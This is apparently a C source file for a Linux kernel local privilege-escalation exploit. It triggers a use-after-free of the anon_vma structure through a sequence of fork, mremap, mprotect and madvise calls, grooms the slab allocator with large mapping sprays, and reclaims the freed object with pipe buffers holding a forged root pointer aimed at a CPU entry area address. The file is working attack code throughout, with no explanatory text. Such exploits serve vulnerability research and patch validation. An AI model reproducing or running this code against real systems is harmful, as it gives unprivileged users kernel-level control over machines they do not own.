#define _GNU_SOURCE

#include <stdint.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <stddef.h>

#include <linux/membarrier.h>

#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/eventfd.h>
#include <sys/wait.h>

#include "common.h"
#include "hbp.h"
#include "log.h"

struct anon_vma {
/* 0*/ uint64_t root;
       struct {
/* 8*/  uint64_t counter;
/*16*/  uint64_t owner;
/*24*/  uint32_t osq;
/*28*/  uint32_t wait_lock;
/*32*/  uint64_t wait_list[2];
       } rwsem;
/*48*/ uint32_t refcount;
/*52*/ uint32_t degree;       
/*56*/ struct anon_vma *parent;
       struct {
/*64*/  uint64_t rb_node;
/*72*/  uint64_t rb_leftmost;
       } rb_root;
/*80*/ uint64_t slub_freeptr;
};

#define NUM_HOLEFILL_SPAM (8000UL)
#define OBJ_SIZE (sizeof(struct anon_vma))
#define OBJS_PER_SLAB (PAGE_SIZE / OBJ_SIZE)
#define NUM_CPU_PARTIAL_SLABS (30UL)
#define NUM_FREELIST_SPAM (OBJS_PER_SLAB * NUM_CPU_PARTIAL_SLABS)
#define NUM_PREFILL (OBJS_PER_SLAB - 1)
#define NUM_POSTFILL (OBJS_PER_SLAB)

#define HOLEFILL_ADDR ((char*)0x10000000UL)
#define HOLEFILL_REGION_SIZE (NUM_HOLEFILL_SPAM * PAGE_SIZE)
#define FREELIST_SPAM_ADDR (HOLEFILL_ADDR + HOLEFILL_REGION_SIZE)
#define FREELIST_SPAM_REGION_SIZE (NUM_FREELIST_SPAM * PAGE_SIZE)
#define MERGE_VMA_REGION_ADDR (FREELIST_SPAM_ADDR + FREELIST_SPAM_REGION_SIZE)
#define MERGE_VMA_REGION_SIZE (5 * PAGE_SIZE)
#define MERGE_VMA_ADDR (MERGE_VMA_REGION_ADDR + PAGE_SIZE)
#define VICTIM_VMA_ADDR (MERGE_VMA_REGION_ADDR + 3 * PAGE_SIZE)
#define PREFILL_ADDR (MERGE_VMA_REGION_ADDR + MERGE_VMA_REGION_SIZE)
#define PREFILL_REGION_SIZE (NUM_PREFILL * PAGE_SIZE)
#define VICTIM_VMA_COPY_ADDR (PREFILL_ADDR + PREFILL_REGION_SIZE)
#define POSTFILL_ADDR (VICTIM_VMA_COPY_ADDR + PAGE_SIZE)
#define POSTFILL_REGION_SIZE (NUM_POSTFILL * PAGE_SIZE)
#define END_ADDR (POSTFILL_ADDR + POSTFILL_REGION_SIZE)

#define NUM_PIPES (60)
int pipefds[NUM_PIPES][2];

struct {
    int child2;
    int child3;
    int child4;
    int child5;
} *shm_page;

void trigger_anonvma_uaf() {
    SYSCHK(madvise(VICTIM_VMA_ADDR, PAGE_SIZE, MADV_PAGEOUT));
}

void rewrite_pipe_contents(int *fds, uint64_t fake_root) {
    char buf[PAGE_SIZE];
    SYSCHK(read(fds[0], buf, PAGE_SIZE));
    struct anon_vma fake_anon_vma = {
        .root = fake_root
    };
    for (int i = 0; i < OBJS_PER_SLAB; i++)
        ((struct anon_vma*)buf)[i] = fake_anon_vma;
    SYSCHK(write(fds[1], buf, PAGE_SIZE));
}

static inline uint64_t fixup_root(uint64_t root) {
    return root - (offsetof(struct anon_vma, rwsem.counter));
}

void post_setup() {
    uint64_t rcx_addr = 0xfffffe000004bfb0;
    uint64_t target = rcx_addr + 3;

    char *db_stack_start = cea_by_cpu(1)->estacks.DB_stack;
    for (int i = 0; i < NUM_PIPES; i++)
        rewrite_pipe_contents(pipefds[i], fixup_root(target));

    while (!map[392])
        trigger_anonvma_uaf();
    
    for (int i = 0; i < NUM_PIPES; i++)
        rewrite_pipe_contents(pipefds[i], fixup_root(target) - 3);
    
    while (1) 
        trigger_anonvma_uaf();
}

int fork_sameparent() {
    return syscall(__NR_clone, SIGCHLD|CLONE_PARENT, NULL, NULL, NULL, 0);
}

void rcu_flush() {
    SYSCHK(syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, 0));
}

int main() {

    map = mmap((void*)0xa000000, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, 0, 0);
    save_status();

    switch (fork())
    {
        case 0:
            exit(hbp_exp());
        case -1:
            die("fork");    
    }    // default: parent

    sync();
    bind_to_cpu(0);

    shm_page = SYSCHK(mmap(0, sizeof(*shm_page), PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0));

    int status;
    eventfd_t dummy_event;

    int evfd = SYSCHK(eventfd(0, EFD_SEMAPHORE));
    int evfd_signal_leaf_ready = SYSCHK(eventfd(0, EFD_SEMAPHORE));
    int evfd_trigger_leaf_release = SYSCHK(eventfd(0, EFD_SEMAPHORE));
    int evfd_setup_done = SYSCHK(eventfd(0, EFD_SEMAPHORE));
    
    SYSCHK(mmap(MERGE_VMA_ADDR, 3 * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED_NOREPLACE, -1, 0));
    *MERGE_VMA_ADDR = 1;    // alloc root

    int child1 = SYSCHK(fork());    // alloc reuse-mid
    if (child1 == 0) {
        int child2 = SYSCHK(fork_sameparent());    // alloc reuse-leaf
        if (child2 == 0) {
            SYSCHK(eventfd_read(evfd, &dummy_event));    // AWAIT reuse-mid exit
            int child3 = SYSCHK(fork_sameparent());    // reuse reuse-mid
            if (child3 == 0) {
                SYSCHK(eventfd_read(evfd_signal_leaf_ready, &dummy_event));
                
                SYSCHK(mmap(HOLEFILL_ADDR, HOLEFILL_REGION_SIZE + FREELIST_SPAM_REGION_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
                *HOLEFILL_ADDR = 1;
                for (int i = 0; i < HOLEFILL_REGION_SIZE + FREELIST_SPAM_REGION_SIZE; i += 2 * PAGE_SIZE) {
                    SYSCHK(mprotect(HOLEFILL_ADDR + i, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC));
                }
                
                SYSCHK(mmap(PREFILL_ADDR, PREFILL_REGION_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
                *PREFILL_ADDR = 1;
                for (int i = 0; i < PREFILL_REGION_SIZE; i += 2 * PAGE_SIZE) {
                    SYSCHK(mprotect(PREFILL_ADDR + i, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC));
                }
                
                SYSCHK(mmap(POSTFILL_ADDR, POSTFILL_REGION_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
                *POSTFILL_ADDR = 1;
                for (int i = 0; i < POSTFILL_REGION_SIZE; i += 2 * PAGE_SIZE) {
                    SYSCHK(mprotect(POSTFILL_ADDR + i, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC));
                }
                
                SYSCHK(mremap(VICTIM_VMA_ADDR, PAGE_SIZE, PAGE_SIZE,
                     MREMAP_MAYMOVE | MREMAP_FIXED, VICTIM_VMA_COPY_ADDR));    // split reuse-mid
                     
                int child4 = SYSCHK(fork_sameparent());
                if (child4 == 0) {
                    *VICTIM_VMA_COPY_ADDR = 1;
                    SYSCHK(eventfd_write(evfd_trigger_leaf_release, 1));
                    SYSCHK(eventfd_read(evfd, &dummy_event));    // AWAIT reuse-leaf exit
                    int child5 = SYSCHK(fork_sameparent());
                    if (child5 == 0) {
                        shm_page->child5 = getpid();
                        SYSCHK(eventfd_write(evfd_setup_done, 1000));
                        SYSCHK(eventfd_read(evfd, &dummy_event));    // AWAIT setup done

                        for (int i = 0; i < NUM_PIPES; i++) {
                            SYSCHK(pipe(pipefds[i]));
                            SYSCHK(fcntl(pipefds[i][0], F_SETPIPE_SZ, PAGE_SIZE));
                        }

                        uint64_t dummy_data[PAGE_SIZE / sizeof(uint64_t)];
                        for (int i = 0; i < PAGE_SIZE / sizeof(uint64_t); i++) {
                            dummy_data[i] = 0xdeadbeefbadc0de0;
                        }

                        rcu_flush();
                        SYSCHK(mremap(VICTIM_VMA_COPY_ADDR, PAGE_SIZE, PAGE_SIZE,
                             MREMAP_MAYMOVE | MREMAP_FIXED, VICTIM_VMA_ADDR));    // merge reuse-leaf
                        SYSCHK(munmap(PREFILL_ADDR, PREFILL_REGION_SIZE));
                        SYSCHK(munmap(POSTFILL_ADDR, POSTFILL_REGION_SIZE));
                        for (int i = 0; i < NUM_CPU_PARTIAL_SLABS; i++) 
                            SYSCHK(munmap(FREELIST_SPAM_ADDR + i * OBJS_PER_SLAB * PAGE_SIZE, PAGE_SIZE));
                        rcu_flush();

                        for (int i = 0; i < NUM_PIPES; i++) 
                            SYSCHK(write(pipefds[i][1], dummy_data, PAGE_SIZE));
                        
                        post_setup();
                        exit(0);
                    }
                    exit(0);
                }
                shm_page->child4 = child4;
                SYSCHK(eventfd_read(evfd_setup_done, &dummy_event));
                exit(0);
            }
            shm_page->child3 = child3;
            SYSCHK(mprotect(MERGE_VMA_ADDR, PAGE_SIZE, PROT_NONE));    // bump reuse-leaf degree from 1 to 2
            SYSCHK(eventfd_write(evfd_signal_leaf_ready, 1));
            SYSCHK(eventfd_read(evfd_trigger_leaf_release, &dummy_event));
            exit(0);
        }
        shm_page->child2 = child2;
        exit(0);
    }
    SYSCHK(waitpid(child1, &status, 0));    // notice reuse-mid exit
    SYSCHK(eventfd_write(evfd, 1));    // signal reuse-mid exit
    SYSCHK(waitpid(shm_page->child2, &status, 0));    // unuse anon_vma 2
    SYSCHK(eventfd_write(evfd, 1));

    SYSCHK(eventfd_read(evfd_setup_done, &dummy_event));
    SYSCHK(waitpid(shm_page->child3, &status, 0));
    SYSCHK(waitpid(shm_page->child4, &status, 0));
    SYSCHK(eventfd_write(evfd, 1));   // setup done
    SYSCHK(waitpid(shm_page->child5, &status, 0));   // wait for main exploit task
}